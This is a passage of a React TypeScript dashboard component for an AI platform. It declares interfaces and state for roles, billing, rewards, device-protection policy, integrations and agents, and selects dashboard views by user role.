import React, { useEffect, useMemo, useState } from "react";
import { useNotifications } from "@/services/notificationStore";
import { chatContext } from "@/services/chatContext";
import { listConversations } from "@/services/conversationStore";
import { confirmSafeAction, recoveryGuidance } from "@/services/safetyPrompts";
import { isFounderUser } from "@/services/founderAccess";
import { applyBrandingToDocument, defaultBranding, loadBranding, saveBranding, type BrandingConfig } from "@/services/branding";

type View = "founder" | "admin" | "developer" | "agents" | "user" | "enterprise";

interface ServiceStatus {
  name: string;
  status: "online" | "offline" | "degraded";
  detail: string;
}

interface KernelSnapshot {
  name: string;
  status: string;
  version: string;
}

interface UsageSummary {
  totals?: {
    requests?: number;
    inputTokens?: number;
    outputTokens?: number;
    totalTokens?: number;
  };
}

interface UserRecord {
  id: string;
  name: string;
  email: string;
  role: "user" | "moderator" | "admin" | "founder" | "developer";
  status: "active" | "pending" | "review" | "banned" | "verified" | "suspended" | "revoked";
  founderRegistered?: boolean;
  companyOwnedOnly?: boolean;
  allowedDeviceId?: string;
  company?: string;
}

interface Offer {
  id: string;
  name: string;
  discountPct: number;
  active: boolean;
  audience: "all" | "new_users" | "enterprise";
}

interface Plan {
  id: string;
  name: string;
  monthly: number;
  annual: number;
  features: string[];
  active: boolean;
}

interface PaymentProfile {
  cardHolder: string;
  cardNumberMasked: string;
  expMonth: string;
  expYear: string;
  billingEmail: string;
  country: string;
  taxId: string;
  saveForAutoRenew: boolean;
}

interface CryptoRewardsConfig {
  enabled: boolean;
  chain: string;
  token: string;
  founderWalletAddress: string;
  rewardPerComputeUnit: string;
  minPayout: string;
  payoutSchedule: "hourly" | "daily" | "weekly" | "monthly";
  donorBonusEnabled: boolean;
  treasuryAllocationPct: number;
  notes: string;
}

interface RewardWallet {
  userId: string;
  userName: string;
  points: number;
  totalEarnedPoints: number;
  pendingCashUsd: number;
  pendingWdc: number;
  updatedAt: number;
}

interface RewardsLedger {
  config: {
    pointsPerUsd: number;
    wdcPerPoint: number;
    wdcListingLive: boolean;
    payoutMode: "points_only" | "cash_only" | "wdc_only" | "hybrid";
  };
  wallets: RewardWallet[];
}

interface IdverseConfig {
  enabled: boolean;
  baseUrl: string;
  projectId: string;
  timeoutMs: number;
  strictBiometric: boolean;
  strictLiveness: boolean;
  apiKey: string;
  apiKeyMasked?: string;
}

interface TrainingStudioOptions {
  dedupe: boolean;
  piiFilter: boolean;
  autoTag: boolean;
  semanticChunking: boolean;
  crawlLinks: boolean;
  citationMode: boolean;
}

interface ModelControl {
  model: string;
  temperature: number;
  maxTokens: number;
  safetyMode: "strict" | "balanced" | "open";
}

interface FeatureFlags {
  [key: string]: boolean;
}

interface SupportTicket {
  id: string;
  subject: string;
  priority: "low" | "medium" | "high";
  status: "open" | "triaged" | "resolved";
  assignee: string;
}

interface DevApiKey {
  id: string;
  name: string;
  apiKey?: string;
  keyMasked: string;
  createdAt: number;
  revoked: boolean;
}

interface PermissionCatalogItem {
  id: string;
  group: string;
  label: string;
  scope: string;
  roles: string[];
}

interface AccessControlState {
  rolePermissions: Record<string, { defaultAction?: string; allow?: string[]; suspend?: string[]; revoke?: string[] }>;
  userOverrides: Array<{ userId: string; allow?: string[]; suspend?: string[]; revoke?: string[] }>;
  updatedAt?: number;
}

interface DeviceProtectionPolicy {
  enabled: boolean;
  monitorCommands: boolean;
  monitorFileChanges: boolean;
  monitorNetworkEgress: boolean;
  blockUnknownExecutables: boolean;
  virusScanOnUpload: boolean;
  dataExfiltrationShield: boolean;
  autoQuarantineOnCritical: boolean;
  enterpriseMode: boolean;
  retentionDays: number;
}

interface ManagedDeviceRecord {
  id: string;
  hostname: string;
  os: string;
  ownerUserId: string;
  ownerOrg: string;
  companyOwned: boolean;
  status: string;
  allowExternalStorage: boolean;
  allowUnsignedApps: boolean;
  antiVirusVersion: string;
  lastSeenAt: number;
  updatedAt: number;
}

interface WorkerActivityRecord {
  id: string;
  actor: string;
  actorRole: string;
  deviceId: string;
  eventType: string;
  command: string;
  filePath: string;
  networkTarget: string;
  details: string;
  severity: "low" | "medium" | "high" | "critical";
  threatSignals: string[];
  orgId?: string;
  workspaceId?: string;
  timestamp: number;
}

interface SecurityAlertRecord {
  id: string;
  title: string;
  severity: "low" | "medium" | "high" | "critical";
  actor: string;
  actorRole: string;
  deviceId: string;
  signals: string[];
  status: string;
  orgId?: string;
  workspaceId?: string;
  timestamp: number;
}

interface DeviceProtectionState {
  policy: DeviceProtectionPolicy;
  managedDevices: ManagedDeviceRecord[];
  workerActivities: WorkerActivityRecord[];
  securityAlerts: SecurityAlertRecord[];
  antiTheft?: {
    enabled?: boolean;
    optInRequired?: boolean;
    remoteLockAuthorizedOnly?: boolean;
  };
  loanProtection?: {
    enabled?: boolean;
    overdueDaysThreshold?: number;
    restrictedModeFeatures?: string[];
    disputeProcess?: boolean;
  };
  resilience?: {
    selfHealingEnabled?: boolean;
    rollbackEnabled?: boolean;
    safeMode?: {
      active?: boolean;
      reason?: string;
      activatedAt?: number;
    };
    lastRollback?: {
      version?: string;
      at?: number;
      actor?: string;
      reason?: string;
    };
  };
  snapshots?: Array<{
    version: string;
    createdAt: number;
    backendBuild?: string;
    frontendBuild?: string;
    schemaVersion?: string;
    envHash?: string;
  }>;
  integrityBaseline?: Record<string, string>;
  backup?: {
    enabled?: boolean;
    cadence?: string;
    retentionDays?: number;
    offsiteTarget?: string;
    encryptAtRest?: boolean;
    includeSnapshots?: boolean;
    includeEvents?: boolean;
    updatedAt?: number;
    lastRun?: {
      id?: string;
      mode?: string;
      startedAt?: number;
      completedAt?: number;
      snapshotCount?: number;
      eventCount?: number;
      encrypted?: boolean;
      offsiteTarget?: string;
      status?: string;
    };
  };
  zeroTrust?: {
    enabled?: boolean;
    lastRotatedAt?: number;
    rotationId?: string;
    policy?: string;
    actor?: string;
  };
  updatedAt?: number;
}

interface WebhookRecord {
  id: string;
  url: string;
  event: string;
  active: boolean;
}

interface IntegrationApp {
  id: string;
  appName: string;
  appDescription?: string;
  owner?: string;
  status: "active" | "paused" | "revoked";
  environment: "development" | "staging" | "production";
  scopes: string[];
  allowedOrigins: string[];
  rateLimitPerMin: number;
  webhookUrl?: string;
  apiKey?: string;
  keyMasked?: string;
  createdAt: number;
  updatedAt?: number;
}

interface DomainLink {
  id: string;
  name: string;
  url: string;
  type: "public" | "internal" | "admin" | "api" | "docs" | "test";
  environment: "development" | "staging" | "production" | "testing";
  audience: "users" | "admins" | "founder" | "developers" | "enterprise" | "internal";
  status: "active" | "inactive" | "testing" | "deprecated";
  description: string;
  tags: string[];
  owner: string;
  notes: string;
  createdAt: number;
  updatedAt: number;
}

interface AgentProfile {
  id: string;
  name: string;
  memoryDays: number;
  tools: string[];
  permission: "workspace" | "project" | "read_only";
}

interface SavedPrompt {
  id: string;
  title: string;
  text: string;
}

interface EnterpriseDepartment {
  id: string;
  name: string;
  members: number;
  tokensPerMonth: number;
}

interface CreatorJobState {
  id: string;
  kind: string;
  status: "queued" | "running" | "completed" | "failed" | string;
  progress: number;
  error?: string;
  result?: Record<string, any>;
  created_at?: number;
  started_at?: number;
  finished_at?: number;
}

interface QualityEvalCoverage {
  suites?: Array<{ suite: string; totalCases: number; domains: string[]; ids: string[] }>;
  totalCases?: number;
  redTeamCases?: number;
}

interface QualityModelSummary {
  router?: {
    updatedAt?: number;
    variants?: Array<{ id: string; weight: number; domains: string[]; enabled: boolean }>;
  };
  outcomes?: {
    totalEvents?: number;
    models?: Array<{
      model: string;
      total: number;
      up: number;
      down: number;
      neutral: number;
      avgLatencyMs: number;
      avgConfidence: number;
      upRate: number;
      downRate: number;
    }>;
  };
}

interface DashboardGuideItem {
  id: string;
  title: string;
  view: View;
  roleScope: Array<"founder" | "admin" | "developer" | "enterprise" | "user" | "all">;
  summary: string;
  keywords: string[];
}

interface FrontierProgramItem {
  id: string;
  group: string;
  title: string;
  description: string;
  status: "planned" | "in_progress" | "blocked" | "done" | string;
  priority: "critical" | "high" | "medium" | "low" | string;
  owner: string;
  targetQuarter: string;
  notes: string;
  updatedAt?: number;
}

interface FrontierProgramMilestone {
  id: string;
  name: string;
  quarter: string;
  owner: string;
  status: "planned" | "in_progress" | "blocked" | "done" | string;
  successCriteria: string[];
  updatedAt?: number;
}

interface FrontierProgramState {
  version?: string;
  updatedAt?: number;
  items: FrontierProgramItem[];
  milestones: FrontierProgramMilestone[];
}

interface FrontierReadiness {
  gate?: boolean;
  readinessScore?: number;
  totals?: {
    items?: number;
    done?: number;
    inProgress?: number;
    planned?: number;
    blocked?: number;
    criticalDone?: number;
    criticalTotal?: number;
    highDone?: number;
    highTotal?: number;
  };
  topBlocked?: FrontierProgramItem[];
  recommendation?: string;
}

type UploadTier = "founder" | "admin" | "paid" | "free";
type DashboardRole = "founder" | "admin" | "developer" | "enterprise" | "user";

const Dashboard: React.FC = () => {
  const { addNotification } = useNotifications();
  const [view, setView] = useState<View>("user");
  const [services, setServices] = useState<ServiceStatus[]>([]);
  const [kernels, setKernels] = useState<KernelSnapshot[]>([]);
  const [usage, setUsage] = useState<UsageSummary>({});
  const [adminLogs, setAdminLogs] = useState<any[]>([]);
  const [adminAudit, setAdminAudit] = useState<any[]>([]);
  const [adminAgents, setAdminAgents] = useState<any[]>([]);
  const [adminVersion, setAdminVersion] = useState<any>({});
  const [adminMetrics, setAdminMetrics] = useState<any>({});
  const [qualityEvalCoverage, setQualityEvalCoverage] = useState<QualityEvalCoverage | null>(null);
  const [qualityReliability, setQualityReliability] = useState<any>(null);
  const [qualityRetrieval, setQualityRetrieval] = useState<any>(null);
  const [qualityTrust, setQualityTrust] = useState<any>(null);
  const [qualityModelSummary, setQualityModelSummary] = useState<QualityModelSummary | null>(null);
  const [modelRouterDraft, setModelRouterDraft] = useState("");
  const [benchmarkBaselinesDraft, setBenchmarkBaselinesDraft] = useState("");
  const [frontierProgram, setFrontierProgram] = useState<FrontierProgramState | null>(null);
  const [frontierReadiness, setFrontierReadiness] = useState<FrontierReadiness | null>(null);
  const [frontierItemId, setFrontierItemId] = useState("");
  const [frontierItemOwner, setFrontierItemOwner] = useState("founder");
  const [frontierItemStatus, setFrontierItemStatus] = useState<"planned" | "in_progress" | "blocked" | "done">("planned");
  const [frontierItemPriority, setFrontierItemPriority] = useState<"critical" | "high" | "medium" | "low">("high");
  const [frontierItemNotes, setFrontierItemNotes] = useState("");
  const [frontierBulkIds, setFrontierBulkIds] = useState("");
  const [frontierBulkStatus, setFrontierBulkStatus] = useState<"planned" | "in_progress" | "blocked" | "done">("in_progress");
  const [frontierMilestoneId, setFrontierMilestoneId] = useState("");
  const [frontierMilestoneName, setFrontierMilestoneName] = useState("");
  const [frontierMilestoneQuarter, setFrontierMilestoneQuarter] = useState("Q2-2026");
  const [frontierMilestoneOwner, setFrontierMilestoneOwner] = useState("founder");
  const [frontierMilestoneStatus, setFrontierMilestoneStatus] = useState<"planned" | "in_progress" | "blocked" | "done">("planned");
  const [frontierMilestoneCriteria, setFrontierMilestoneCriteria] = useState("");
  const [twinOutput, setTwinOutput] = useState<any>(null);
  const [backendOutput, setBackendOutput] = useState<any>(null);
  const [twinQuestion, setTwinQuestion] = useState("");
  const [twinZipPath, setTwinZipPath] = useState("");
  const [twinUploadedFiles, setTwinUploadedFiles] = useState<
    Array<{ name: string; type: string; size: number; text_sample: string }>
  >([]);
  const [twinUploadedZips, setTwinUploadedZips] = useState<Array<{ name: string; data_base64: string }>>([]);
  const [twinIncludeAnalyze, setTwinIncludeAnalyze] = useState(true);
  const [twinIncludeReport, setTwinIncludeReport] = useState(true);
  const [dashboardRole, setDashboardRole] = useState<DashboardRole>("user");
  const [dashboardAssistantQuery, setDashboardAssistantQuery] = useState("");

  const twinUploadTier = useMemo<UploadTier>(() => {
    if (isFounderUser()) return "founder";
    try {
      const rawUser = localStorage.getItem("neuroedge_user");
      const user = rawUser ? JSON.parse(rawUser) : {};
      const role = String(user?.role || "").toLowerCase();
      if (role === "founder") return "founder";
      if (role === "admin" || role === "moderator") return "admin";
      const tier = String(
        user?.plan ||
          localStorage.getItem("neuroedge_plan") ||
          localStorage.getItem("neuroedge_subscription_tier") ||
          ""
      ).toLowerCase();
      if (tier === "pro" || tier === "enterprise" || tier === "paid") return "paid";
    } catch {
      // fallback below
    }
    return "free";
  }, []);

  useEffect(() => {
    if (isFounderUser()) {
      setDashboardRole("founder");
      return;
    }
    try {
      const rawUser = localStorage.getItem("neuroedge_user");
      const user = rawUser ? JSON.parse(rawUser) : {};
      const role = String(user?.role || "").trim().toLowerCase();
      const tier = String(
        user?.plan ||
          localStorage.getItem("neuroedge_plan") ||
          localStorage.getItem("neuroedge_subscription_tier") ||
          ""
      )
        .trim()
        .toLowerCase();
      if (role === "founder") {
        setDashboardRole("founder");
        return;
      }
      if (role === "admin" || role === "moderator") {
        setDashboardRole("admin");
        return;
      }
      if (role === "developer") {
        setDashboardRole("developer");
        return;
      }
      if (role === "enterprise" || tier === "enterprise") {
        setDashboardRole("enterprise");
        return;
      }
      if (tier === "pro" || tier === "paid") {
        setDashboardRole("developer");
        return;
      }
    } catch {
      // keep user fallback
    }
    setDashboardRole("user");
  }, []);

  const allowedViews = useMemo<View[]>(() => {
    switch (dashboardRole) {
      case "founder":
        return ["founder", "admin", "developer", "agents", "user", "enterprise"];
      case "admin":
        return ["admin", "developer", "agents", "user", "enterprise"];
      case "developer":
        return ["developer", "agents", "user"];
      case "enterprise":
        return ["enterprise", "agents", "user"];
      default:
        return ["user", "agents"];
    }
  }, [dashboardRole]);
  const canAccessAdminOps = useMemo(
    () => dashboardRole === "founder" || dashboardRole === "admin",
    [dashboardRole]
  );

  const dashboardGuideCatalog = useMemo<DashboardGuideItem[]>(
    () => [
      {
        id: "founder-aegis",
        title: "Aegis Shield Controls",
        view: "founder",
        roleScope: ["founder", "admin"],
        summary: "Device protection, anti-theft, safe mode, integrity checks, rollback, and zero-trust controls.",
        keywords: ["aegis", "shield", "safe mode", "rollback", "integrity", "security", "antitheft", "backup"],
      },
      {
        id: "founder-twin",
        title: "Twin Systems",
        view: "founder",
        roleScope: ["founder", "admin"],
        summary: "Twin Scan, Analyze, Evolve, Report, Ask Twin, and NeuroTwin profile controls.",
        keywords: ["twin", "neurotwin", "scan", "analyze", "evolve", "report", "ask twin"],
      },
      {
        id: "founder-training",
        title: "Training Studio",
        view: "founder",
        roleScope: ["founder", "admin"],
        summary: "Ingest text/files/urls and run training jobs for system learning.",
        keywords: ["training", "ingest", "dataset", "feedback", "crawl", "urls", "zip"],
      },
      {
        id: "founder-branding",
        title: "Branding Studio",
        view: "founder",
        roleScope: ["founder", "admin"],
        summary: "Upload logos/backgrounds and configure product visual identity.",
        keywords: ["branding", "logo", "favicon", "theme", "background"],
      },
      {
        id: "founder-links",
        title: "Domain & Link Registry",
        view: "founder",
        roleScope: ["founder", "admin"],
        summary: "Register domains, classify audience, verify reachability, and manage link lifecycle.",
        keywords: ["domain", "links", "url", "registry", "verify", "audience"],
      },
      {
        id: "admin-moderation",
        title: "Admin Moderation",
        view: "admin",
        roleScope: ["founder", "admin"],
        summary: "Manage users, content reviews, support tickets, and moderation actions.",
        keywords: ["moderation", "tickets", "support", "users", "reports", "review"],
      },
      {
        id: "developer-api",
        title: "Developer API Workspace",
        view: "developer",
        roleScope: ["founder", "admin", "developer"],
        summary: "Create API keys, manage webhooks, model/env settings, and debug logs.",
        keywords: ["api", "keys", "webhook", "sdk", "debug", "environment", "dev"],
      },
      {
        id: "agents-studio",
        title: "AI Agent Studio",
        view: "agents",
        roleScope: ["all"],
        summary: "Create/edit agents, configure tools, permissions, and memory settings.",
        keywords: ["agent", "studio", "tools", "memory", "permissions"],
      },
      {
        id: "user-chat",
        title: "User Chat Workspace",
        view: "user",
        roleScope: ["all"],
        summary: "Main chat, saved prompts, usage visibility, and personal workspace controls.",
        keywords: ["chat", "prompt", "history", "workspace", "new chat"],
      },
      {
        id: "enterprise-governance",
        title: "Enterprise Governance",
        view: "enterprise",
        roleScope: ["founder", "admin", "enterprise"],
        summary: "Department usage, team roles, compliance exports, and SSO controls.",
        keywords: ["enterprise", "department", "sso", "compliance", "audit", "roles"],
      },
      {
        id: "visionforge-media",
        title: "Create Media (VisionForge)",
        view: "developer",
        roleScope: ["all"],
        summary: "Generate/edit images and videos, script-to-video, captions, and creator history.",
        keywords: ["visionforge", "creator", "media", "image", "video", "thumbnail", "subtitles", "background remove"],
      },
      {
        id: "payments-subscriptions",
        title: "Subscriptions, Billing, and Rewards",
        view: "founder",
        roleScope: ["founder", "admin", "enterprise", "user"],
        summary: "Manage plans, payment profile, reward wallets, and crypto reward settings.",
        keywords: ["billing", "subscription", "payment", "revenue", "wallet", "rewards", "crypto"],
      },
    ],
    []
  );

  const dashboardAssistantResults = useMemo(() => {
    const q = dashboardAssistantQuery.trim().toLowerCase();
    const role = dashboardRole;
    const visible = dashboardGuideCatalog.filter((item) => {
      if (item.roleScope.includes("all")) return true;
      return item.roleScope.includes(role);
    });
    if (!q) return visible.slice(0, 8);
    const tokens = q.split(/\s+/).filter(Boolean);
    const scored = visible
      .map((item) => {
        const blob = `${item.title} ${item.summary} ${item.keywords.join(" ")}`.toLowerCase();
        let score = 0;
        for (const t of tokens) {
          if (blob.includes(t)) score += 2;
          if (item.keywords.some((k) => k.includes(t))) score += 1;
          if (String(item.view).includes(t)) score += 1;
        }
        return { item, score };
      })
      .filter((x) => x.score > 0)
      .sort((a, b) => b.score - a.score);
    return scored.map((s) => s.item).slice(0, 10);
  }, [dashboardAssistantQuery, dashboardGuideCatalog, dashboardRole]);

  useEffect(() => {
    if (!allowedViews.includes(view)) {
      setView(allowedViews[0] || "user");
    }
  }, [allowedViews, view]);

  useEffect(() => {
    const preferred: Record<DashboardRole, View> = {
      founder: "founder",
      admin: "admin",
      developer: "developer",
      enterprise: "enterprise",
      user: "user",
    };
    const next = preferred[dashboardRole] || "user";
    if (view === "user" && next !== "user" && allowedViews.includes(next)) {
      setView(next);
    }
  }, [dashboardRole, allowedViews, view]);

  const [users, setUsers] = useState<UserRecord[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_dashboard_users_v1");
      return raw
        ? JSON.parse(raw)
        : [
            { id: "u1", name: "Joseph Were", email: "founder@neuroedge.ai", role: "founder", status: "verified" },
            { id: "u2", name: "Guest User", email: "guest@local", role: "user", status: "active" },
            { id: "u3", name: "Ops Moderator", email: "ops@neuroedge.ai", role: "moderator", status: "active" },
          ];
    } catch {
      return [];
    }
  });

  const [offers, setOffers] = useState<Offer[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_dashboard_offers_v1");
      return raw
        ? JSON.parse(raw)
        : [
            { id: "off1", name: "Launch Promo", discountPct: 20, active: true, audience: "new_users" },
            { id: "off2", name: "Enterprise Pilot", discountPct: 15, active: false, audience: "enterprise" },
          ];
    } catch {
      return [];
    }
  });

  const [plans, setPlans] = useState<Plan[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_dashboard_plans_v1");
      return raw
        ? JSON.parse(raw)
        : [
            { id: "p1", name: "Free", monthly: 0, annual: 0, active: true, features: ["Basic Chat", "History"] },
            { id: "p2", name: "Pro", monthly: 19, annual: 190, active: true, features: ["Advanced Models", "Research", "API"] },
            { id: "p3", name: "Enterprise", monthly: 99, annual: 990, active: true, features: ["SSO", "Audit Export", "Dedicated Support"] },
          ];
    } catch {
      return [];
    }
  });

  const [payment, setPayment] = useState<PaymentProfile>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_dashboard_payment_v1");
      return raw
        ? JSON.parse(raw)
        : {
            cardHolder: "",
            cardNumberMasked: "",
            expMonth: "",
            expYear: "",
            billingEmail: "",
            country: "",
            taxId: "",
            saveForAutoRenew: true,
          };
    } catch {
      return {
        cardHolder: "",
        cardNumberMasked: "",
        expMonth: "",
        expYear: "",
        billingEmail: "",
        country: "",
        taxId: "",
        saveForAutoRenew: true,
      };
    }
  });

  const [paymentDraftCard, setPaymentDraftCard] = useState("");
  const [cryptoRewards, setCryptoRewards] = useState<CryptoRewardsConfig>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_dashboard_crypto_rewards_v1");
      return raw
        ? JSON.parse(raw)
        : {
            enabled: false,
            chain: "NeuroChain",
            token: "WDC",
            founderWalletAddress: "",
            rewardPerComputeUnit: "0.0001",
            minPayout: "1.0",
            payoutSchedule: "weekly",
            donorBonusEnabled: true,
            treasuryAllocationPct: 10,
            notes: "Compute-donation rewards config",
          };
    } catch {
      return {
        enabled: false,
        chain: "NeuroChain",
        token: "WDC",
        founderWalletAddress: "",
        rewardPerComputeUnit: "0.0001",
        minPayout: "1.0",
        payoutSchedule: "weekly",
        donorBonusEnabled: true,
        treasuryAllocationPct: 10,
        notes: "Compute-donation rewards config",
      };
    }
  });
  const [modelControl, setModelControl] = useState<ModelControl>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_model_control_v2");
      return raw
        ? JSON.parse(raw)
        : {
            model: "neuroedge-13b-instruct",
            temperature: 0.3,
            maxTokens: 2048,
            safetyMode: "balanced",
          };
    } catch {
      return {
        model: "neuroedge-13b-instruct",
        temperature: 0.3,
        maxTokens: 2048,
        safetyMode: "balanced",
      };
    }
  });

  const [featureFlags, setFeatureFlags] = useState<FeatureFlags>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_feature_flags_v2");
      return raw
        ? JSON.parse(raw)
        : {
            research_pipeline: true,
            streaming_tokens: true,
            mesh_inference: true,
            strict_citations: true,
            founder_mode: true,
            multimodal_uploads: false,
            auto_eval_nightly: true,
            enterprise_sso: false,
          };
    } catch {
      return {};
    }
  });

  const [devWebhook, setDevWebhook] = useState("");
  const [rewardsLedger, setRewardsLedger] = useState<RewardsLedger>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_rewards_ledger_v1");
      return raw
        ? JSON.parse(raw)
        : {
            config: {
              pointsPerUsd: 100,
              wdcPerPoint: 0.01,
              wdcListingLive: false,
              payoutMode: "points_only",
            },
            wallets: [],
          };
    } catch {
      return {
        config: {
          pointsPerUsd: 100,
          wdcPerPoint: 0.01,
          wdcListingLive: false,
          payoutMode: "points_only",
        },
        wallets: [],
      };
    }
  });
  const [idverseConfig, setIdverseConfig] = useState<IdverseConfig>(() => ({
    enabled: true,
    baseUrl: "",
    projectId: "",
    timeoutMs: 12000,
    strictBiometric: true,
    strictLiveness: true,
    apiKey: "",
    apiKeyMasked: "",
  }));
  const [idverseStatus, setIdverseStatus] = useState<any>(null);
  const [trainingTitle, setTrainingTitle] = useState("Founder Training Note");
  const [trainingText, setTrainingText] = useState("");
  const [trainingTagsCsv, setTrainingTagsCsv] = useState("founder,custom,high-signal");
  const [trainingUrls, setTrainingUrls] = useState("");
  const [trainingResearchQuery, setTrainingResearchQuery] = useState("");
  const [trainingUploadFiles, setTrainingUploadFiles] = useState<Array<{ name: string; type: string; textContent?: string; base64?: string }>>([]);
  const [trainingOverview, setTrainingOverview] = useState<any>(null);
  const [ragDomain, setRagDomain] = useState<"medicine" | "agriculture" | "market" | "general">("general");
  const [ragQuery, setRagQuery] = useState("");
  const [bootstrapIncludeSecondary, setBootstrapIncludeSecondary] = useState(false);
  const [autoRefreshEnabled, setAutoRefreshEnabled] = useState(true);
  const [autoRefreshHourUtc, setAutoRefreshHourUtc] = useState("2");
  const [autoRefreshMinuteUtc, setAutoRefreshMinuteUtc] = useState("10");
  const [autoRefreshStaleHours, setAutoRefreshStaleHours] = useState("36");
  const [trainingJobMode, setTrainingJobMode] = useState<"incremental" | "full" | "eval_only">("incremental");
  const [trainingEvalSuite, setTrainingEvalSuite] = useState<"core" | "math" | "code" | "research" | "all">("core");
  const [endpointMethod, setEndpointMethod] = useState<"GET" | "POST">("GET");
  const [endpointPath, setEndpointPath] = useState("/auth/whoami");
  const [endpointBody, setEndpointBody] = useState("{\n  \"example\": true\n}");
  const [trainingOptions, setTrainingOptions] = useState<TrainingStudioOptions>({
    dedupe: true,
    piiFilter: true,
    autoTag: true,
    semanticChunking: true,
    crawlLinks: false,
    citationMode: true,
  });
  const [rewardUserId, setRewardUserId] = useState("u2");
  const [rewardUserName, setRewardUserName] = useState("Guest User");
  const [rewardPointsInput, setRewardPointsInput] = useState("100");
  const [devEnvironment, setDevEnvironment] = useState<"dev" | "staging" | "prod">("dev");
  const [devApiKeys, setDevApiKeys] = useState<DevApiKey[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_dev_api_keys_v1");
      return raw
        ? JSON.parse(raw)
        : [{ id: "k1", name: "Default SDK Key", keyMasked: "neur...9x3a", createdAt: Date.now(), revoked: false }];
    } catch {
      return [];
    }
  });
  const [webhooks, setWebhooks] = useState<WebhookRecord[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_webhooks_v1");
      return raw ? JSON.parse(raw) : [];
    } catch {
      return [];
    }
  });
  const [integrations, setIntegrations] = useState<IntegrationApp[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_integrations_v1");
      return raw ? JSON.parse(raw) : [];
    } catch {
      return [];
    }
  });
  const [domainLinks, setDomainLinks] = useState<DomainLink[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_domain_links_v1");
      return raw ? JSON.parse(raw) : [];
    } catch {
      return [];
    }
  });
  const [domainLinkDraft, setDomainLinkDraft] = useState({
    id: "",
    name: "",
    url: "",
    type: "public" as DomainLink["type"],
    environment: "production" as DomainLink["environment"],
    audience: "users" as DomainLink["audience"],
    status: "active" as DomainLink["status"],
    description: "",
    tagsCsv: "",
    owner: "",
    notes: "",
  });
  const [integrationDraft, setIntegrationDraft] = useState({
    appName: "",
    appDescription: "",
    environment: "production" as IntegrationApp["environment"],
    scopesCsv: "chat:write, ai:infer",
    originsCsv: "",
    webhookUrl: "",
    rateLimitPerMin: "120",
  });
  const [permissionCatalog, setPermissionCatalog] = useState<PermissionCatalogItem[]>([]);
  const [accessControl, setAccessControl] = useState<AccessControlState>({
    rolePermissions: {},
    userOverrides: [],
    updatedAt: 0,
  });
  const [selectedAccessRole, setSelectedAccessRole] = useState("user");
  const [selectedAccessUserId, setSelectedAccessUserId] = useState("u2");
  const [deviceProtection, setDeviceProtection] = useState<DeviceProtectionState>({
    policy: {
      enabled: true,
      monitorCommands: true,
      monitorFileChanges: true,
      monitorNetworkEgress: true,
      blockUnknownExecutables: true,
      virusScanOnUpload: true,
      dataExfiltrationShield: true,
      autoQuarantineOnCritical: true,
      enterpriseMode: true,
      retentionDays: 90,
    },
    managedDevices: [],
    workerActivities: [],
    securityAlerts: [],
    antiTheft: { enabled: true, optInRequired: true, remoteLockAuthorizedOnly: true },
    loanProtection: {
      enabled: true,
      overdueDaysThreshold: 30,
      restrictedModeFeatures: ["emergency_calls", "payment_portal", "support_access"],
      disputeProcess: true,
    },
    resilience: {
      selfHealingEnabled: true,
      rollbackEnabled: true,
      safeMode: { active: false, reason: "", activatedAt: 0 },
    },
    snapshots: [],
    integrityBaseline: {},
    backup: {
      enabled: true,
      cadence: "daily",
      retentionDays: 30,
      offsiteTarget: "encrypted-offsite",
      encryptAtRest: true,
      includeSnapshots: true,
      includeEvents: true,
    },
    zeroTrust: {
      enabled: true,
      lastRotatedAt: 0,
      rotationId: "",
      policy: "token validation on every request + service auth",
    },
    updatedAt: 0,
  });
  const [deviceDraft, setDeviceDraft] = useState({
    id: "",
    hostname: "",
    os: "linux",
    ownerUserId: "u2",
    ownerOrg: "personal",
    companyOwned: true,
    antiVirusVersion: "",
  });
  const [creatorPrompt, setCreatorPrompt] = useState("");
  const [creatorScript, setCreatorScript] = useState("");
  const [creatorImagePath, setCreatorImagePath] = useState("");
  const [creatorJobId, setCreatorJobId] = useState("");
  const [creatorJob, setCreatorJob] = useState<CreatorJobState | null>(null);
  const [creatorHistory, setCreatorHistory] = useState<any[]>([]);
  const [creatorBusy, setCreatorBusy] = useState(false);
  const [intelligenceQuestion, setIntelligenceQuestion] = useState("");
  const [intelligenceMode, setIntelligenceMode] = useState("step_by_step");
  const [intelligenceOutput, setIntelligenceOutput] = useState<any>(null);
  const [intelligenceSvg, setIntelligenceSvg] = useState("");
  const [intelligenceExportPath, setIntelligenceExportPath] = useState("");
  const [aegisOutput, setAegisOutput] = useState<any>(null);
  const [aegisMalwareInput, setAegisMalwareInput] = useState("");
  const [aegisPromptInput, setAegisPromptInput] = useState("");
  const [aegisDeviceId, setAegisDeviceId] = useState("");
  const [aegisLoanStatus, setAegisLoanStatus] = useState<"current" | "grace" | "overdue" | "dispute">("current");
  const [aegisOverdueDays, setAegisOverdueDays] = useState("0");
  const [aegisSnapshotVersion, setAegisSnapshotVersion] = useState("");
  const [aegisSafeModeReason, setAegisSafeModeReason] = useState("Security incident response");
  const [latestGeneratedApiKey, setLatestGeneratedApiKey] = useState("");
  const [webhookEvent, setWebhookEvent] = useState("chat.completed");
  const [supportTickets, setSupportTickets] = useState<SupportTicket[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_support_tickets_v1");
      return raw
        ? JSON.parse(raw)
        : [
            { id: "t-1001", subject: "Login failed", priority: "medium", status: "open", assignee: "ops" },
            { id: "t-1002", subject: "Billing mismatch", priority: "high", status: "triaged", assignee: "finance" },
          ];
    } catch {
      return [];
    }
  });
  const [newTicket, setNewTicket] = useState("");
  const [agentsLocal, setAgentsLocal] = useState<AgentProfile[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_agent_profiles_v1");
      return raw
        ? JSON.parse(raw)
        : [
            { id: "ag1", name: "Research Agent", memoryDays: 30, tools: ["research", "web"], permission: "workspace" },
            { id: "ag2", name: "Code Agent", memoryDays: 14, tools: ["code", "files"], permission: "project" },
          ];
    } catch {
      return [];
    }
  });
  const [savedPrompts, setSavedPrompts] = useState<SavedPrompt[]>(() => {
    try {
